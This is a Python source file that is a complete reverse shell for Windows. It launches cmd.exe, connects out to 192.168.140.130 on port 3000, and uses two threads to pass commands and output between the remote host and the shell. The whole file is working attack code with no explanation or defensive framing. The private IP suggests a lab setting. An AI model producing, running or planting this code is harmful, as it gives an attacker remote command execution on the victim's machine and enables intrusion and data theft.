import socket, os, threading, subprocess as sp

def send_output():
    while True:
        output = os.read(p.stdout.fileno(), 1024)
        s.send(output)

def receive_input():
    while True:
        input_data = s.recv(1024)
        os.write(p.stdin.fileno(), input_data)

p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
s = socket.socket()
s.connect(('192.168.140.130',3000))

output_thread = threading.Thread(target=send_output)
output_thread.daemon = True
output_thread.start()

input_thread = threading.Thread(target=receive_input)
input_thread.start()
